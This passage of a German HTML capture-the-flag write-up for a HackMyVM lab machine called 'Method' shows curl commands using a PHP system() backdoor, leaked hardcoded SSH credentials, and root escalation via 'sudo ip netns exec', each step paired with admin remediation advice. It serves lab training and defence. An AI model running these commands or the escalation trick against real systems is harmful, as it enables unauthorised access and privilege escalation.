+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X POST 'http://method.hmv/secret.php' -d 'HackMyVM=ls /home/prakasaka' -H 'Content-Type: application/x-www-form-urlencoded'</span></div>
+                    <pre>
+You Found ME : - ( uSeR.txt
+                    </pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X POST 'http://method.hmv/secret.php' -d 'HackMyVM=cat /home/prakasaka/uSeR.txt' -H 'Content-Type: application/x-www-form-urlencoded'</span></div>
+                    <pre>
+You Found ME : - ( <span class="password">e4408105ca9c2a5c2714a818c475d06F</span>
+                    </pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Die Enumeration bestätigt den Benutzer `prakasaka` als einzigen regulären Benutzer mit Bash-Zugriff. Die User-Flag (`e4408105ca9c...`) wurde im Home-Verzeichnis dieses Benutzers gefunden und ausgelesen.
+             </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dokumentieren Sie die User-Flag. Der nächste Schritt ist, Anmeldedaten für `prakasaka` zu finden, um sich per SSH anzumelden. Untersuchen Sie dazu Konfigurationsdateien oder Quellcode im Web-Root-Verzeichnis (`/var/www/html`).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Beheben Sie die RCE. Überprüfen Sie Dateiberechtigungen in Home-Verzeichnissen.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Weitere Enumeration des Web-Roots (`/var/www/html`) und relevanter Dateien (`note.txt`, `secret.php`).
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X POST 'http://method.hmv/secret.php' -d 'HackMyVM=ls -la /home/prakasaka' -H 'Content-Type: application/x-www-form-urlencoded'</span></div>
+                    <pre>
+You Found ME : - (<pre>total 24
+drwxr-xr-x 2 prakasaka prakasaka 4096 Oct 23  2021 .
+drwxr-xr-x 3 root      root      4096 Oct 23  2021 ..
+lrwxrwxrwx 1 root      root         9 Oct 23  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 prakasaka prakasaka  220 Oct 23  2021 .bash_logout
+-rw-r--r-- 1 prakasaka prakasaka 3526 Oct 23  2021 .bashrc
+-rw-r--r-- 1 prakasaka prakasaka  807 Oct 23  2021 .profile
+-rw-r--r-- 1 root      root        33 Oct 23  2021 uSeR.txt
+                    </pre> <!-- Maskierung von <pre> entfernt -->
+                 </div>
+             </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X POST 'http://method.hmv/secret.php' -d 'HackMyVM=ls -la /var/www/html' -H 'Content-Type: application/x-www-form-urlencoded'</span></div>
+                     <pre>
+You Found ME : - (<pre>total 7264
+drwxr-xr-x 2 root root    4096 Oct 23  2021 .
+drwxr-xr-x 3 root root    4096 Oct 23  2021 ..
+-rw-r--r-- 1 root root 5325119 May  6  2021 hacker.gif
+-rw-r--r-- 1 root root     344 Oct 23  2021 index.htm
+-rw-r--r-- 1 root root    3690 Oct 23  2021 index.html
+-rw-r--r-- 1 root root      23 Oct 23  2021 note.txt
+-rw-r--r-- 1 root root 2078389 Nov 30  2020 office.gif
+-rw-r--r-- 1 root root     471 Oct 23  2021 secret.php
+-rw-r--r-- 1 root root     285 Oct 23  2021 sitemap.xml
+                    </pre> <!-- Maskierung von <pre> entfernt -->
+                 </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X POST 'http://method.hmv/secret.php' -d 'HackMyVM=cat /var/www/html/note.txt' -H 'Content-Type: application/x-www-form-urlencoded'</span></div>
+                     <pre>
+You Found ME : - ( Enumeration is the key
+                     </pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X POST 'http://method.hmv/secret.php' -d 'HackMyVM=cat /var/www/html/secret.php' -H 'Content-Type: application/x-www-form-urlencoded'</span></div>
+                     <pre>
+You Found ME : - ( <?php
+if(isset($_GET['HackMyVM'])){
+	echo "Now the main part what it is loooooool";
+echo "Try other method";
+        die;
+}
+if(isset($_POST['HackMyVM'])){
+        echo "You Found ME : - (";
+        $cmd = ($_POST['HackMyVM']);
+        system($cmd);
+        die;
+}
+else {
+header("Location: https://images-na.ssl-images-amazon.com/images/I/31YDo0l4ZrL._SX331_BO1,204,203,200_.jpg");
+}
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+$ok="prakasaka:<span class="password">th3-!llum!n@t0r</span>";
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+?>
+                     </pre> <!-- Maskierung von PHP-Tags -->
+                 </div>
+             </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Auflistung von `/home/prakasaka` zeigt, dass `.bash_history` deaktiviert ist. Die Auflistung von `/var/www/html` zeigt die erwarteten Dateien, einschließlich `secret.php`. Die Datei `note.txt` enthält den Hinweis "Enumeration is the key". Der entscheidende Fund ist das Auslesen des Quellcodes von `secret.php`. Dieser bestätigt nicht nur die RCE-Schwachstelle (`system($_POST['HackMyVM'])`), sondern enthält auch **hardcodierte Anmeldedaten** in einer auskommentierten oder Variablenzuweisung: `$ok="prakasaka:<span class="password">th3-!llum!n@t0r</span>";`.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwenden Sie die gefundenen Anmeldedaten (`prakasaka` / `<span class="password">th3-!llum!n@t0r</span>`) für den SSH-Login auf Port 22.
+                <br>
+                <strong>Empfehlung (Admin):** **Dringend:** Entfernen Sie hardcodierte Anmeldedaten aus dem Quellcode. Verwenden Sie sichere Methoden zur Verwaltung von Geheimnissen (z.B. Umgebungsvariablen, Konfigurationsmanagement-Tools, Secret Vaults). Beheben Sie die RCE-Schwachstelle. Ändern Sie das Passwort von `prakasaka`.
+            </p>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Versuch, sich per SSH mit den gefundenen Anmeldedaten anzumelden. Der Benutzer wird zur Bestätigung des Host-Schlüssels aufgefordert und gibt das Passwort ein.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh prakasaka@method.hmv</span></div>
+                     <pre>
+The authenticity of host 'method.hmv (192.168.2.127)' can't be established.
+ED25519 key fingerprint is SHA256:D53VHP4fq2RTpU4+raTrdLYqT8iRcYHlLV+W3TQMFh0.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span>
+Warning: Permanently added 'method.hmv' (ED25519) to the list of known hosts.
+prakasaka@method.hmv's password: <span class="password">th3-!llum!n@t0r</span>
+Linux method 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Oct 23 15:52:32 2021 from 192.168.1.5
+prakasaka@method:~$
+                     </pre>
+                 </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> **SSH-Login erfolgreich!** Der Pentester hat nun eine stabile Shell als Benutzer `prakasaka`.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Beginnen Sie mit der Privilege Escalation Enumeration (`sudo -l`, SUID, Capabilities etc.).
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Ändern Sie das Passwort von `prakasaka`. Entfernen Sie die hardcodierten Credentials aus `secret.php`.
+             </p>
+        </section>
+
+        <section id="privilege-escalation-prep">
+             <h2>Privilege Escalation Preparation</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Als Benutzer `prakasaka` wird `sudo -l` ausgeführt, um die Berechtigungen zu überprüfen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">prakasaka@method:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for prakasaka on method:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User prakasaka may run the following commands on method:
+    (!root) NOPASSWD: /bin/bash
+    (root) /bin/ip
+                    </pre>
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> **Kritischer Fund für Privilege Escalation!**
+                *   `(!root) NOPASSWD: /bin/bash`: Erlaubt das Ausführen von `/bin/bash` als *jeder andere Benutzer außer root* ohne Passwort. Dies ist für die direkte Root-Eskalation nicht nützlich.
+                *   `(root) /bin/ip`: Erlaubt das Ausführen des Befehls `/bin/ip` als `root`. Das Passwort für `prakasaka` wird benötigt (da `NOPASSWD` nicht angegeben ist), aber das Passwort ist bekannt. Der `ip`-Befehl kann oft zur Rechteausweitung missbraucht werden (siehe GTFOBins).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Recherchieren Sie Methoden zur Rechteausweitung mittels `sudo /bin/ip` (z.B. GTFOBins). Die `ip netns exec`-Methode ist ein bekannter Weg.
+                <br>
+                <strong>Empfehlung (Admin):** **Dringend:** Überprüfen Sie die `sudoers`-Regel. Das Erlauben von `/bin/ip` als root ist gefährlich. Gewähren Sie `sudo`-Rechte nur für spezifische, eingeschränkte Befehle oder Skripte, nicht für mächtige Tools wie `ip`. Entfernen Sie die `(!root) NOPASSWD: /bin/bash`-Regel, da sie wenig Sinn ergibt und potenziell missbraucht werden könnte, um die Identität anderer Benutzer anzunehmen.
+            </p>
+        </section>
+
+        <section id="proof-of-concept">
+             <h2>Proof of Concept (Privilege Escalation via Sudo IP)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ausnutzung der `sudo ip`-Berechtigung mittels der `ip netns exec`-Technik, die auf GTFOBins dokumentiert ist.
+                1.  `sudo ip netns add foo`: Erstellt einen neuen Netzwerk-Namespace namens `foo`. Da `ip` als `root` ausgeführt wird, erfordert dies das Passwort von `prakasaka`.
+                2.  `sudo ip netns exec foo /bin/bash`: Führt `/bin/bash` innerhalb des neu erstellten Namespaces aus. Da `ip netns exec` ebenfalls als `root` läuft, erbt die gestartete Bash-Shell die Root-Privilegien.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- GTFOBins Link als Kommentar -->
+                     <pre># https://gtfobins.github.io/gtfobins/ip/#sudo</pre>
+                    <div class="prompt" style="color: yellow;">prakasaka@method:~$ <span class="command">sudo ip netns add foo</span></div>
+                     <pre>
+[sudo] password for prakasaka: <span class="password">th3-!llum!n@t0r</span>
+                     </pre>
+                    <div class="prompt" style="color: yellow;">prakasaka@method:~$ <span class="command">sudo ip netns exec foo /bin/bash</span></div>
+                     <pre>
+root@method:/home/prakasaka#
+                     </pre> <!-- Prompt wechselt zu root -->
+                 </div>
+             </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> **Privilege Escalation erfolgreich!** Die Technik funktionierte wie erwartet, und eine Root-Shell wurde erlangt.
+            </p>
+            <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Bestätigen Sie die Identität mit `id`. Lesen Sie die Root-Flag. Führen Sie Post-Exploitation durch.
+                 <br>
+                 <strong>Empfehlung (Admin):** **Dringend:** Beheben Sie die unsichere `sudoers`-Regel für `/bin/ip`. Überprüfen Sie alle `sudo`-Regeln auf ähnliche Schwachstellen.
+            </p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                     <div class="flag-command">cat /home/prakasaka/uSeR.txt</div>
+                     <div class="flag-value"><span class="password">e4408105ca9c2a5c2714a818c475d06F</span></div>
+                </div>
+
+                <div class="flag-entry">
+                     <div class="flag-command">cat /root/rOot.txt</div> <!-- Name aus Text übernommen -->
+                     <div class="flag-value"><span class="password">fc9c6eb6265921315e7c70aebd22af7F</span></div>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Nachdem Root-Zugriff erlangt wurde, werden die User- und Root-Flags gelesen. Die User-Flag (`uSeR.txt`) befindet sich im Home-Verzeichnis von `prakasaka`, die Root-Flag (`rOot.txt`) im Home-Verzeichnis von `root`.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">root@method:~# <span class="command">cat rOot.txt</span></div>
+                     <pre><span class="password">fc9c6eb6265921315e7c70aebd22af7F</span></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">root@method:~# <span class="command">cat /home/prakasaka/uSeR.txt</span></div>
+                     <pre><span class="password">e4408105ca9c2a5c2714a818c475d06F</span></pre>
+                 </div>
+             </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Beide Flags wurden erfolgreich gefunden und ausgelesen. Das Ziel der Übung wurde erreicht.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dokumentieren Sie die Flags und schließen Sie den Bericht ab.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Konzentrieren Sie sich auf die Behebung der Schwachstellen: RCE in `secret.php`, hardcodierte Anmeldedaten, unsichere `sudoers`-Regel.
+            </p>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2023-04-17</p> <!-- Datum aus Nikto/Nmap -->
+    </footer>
+</body>
+</html>
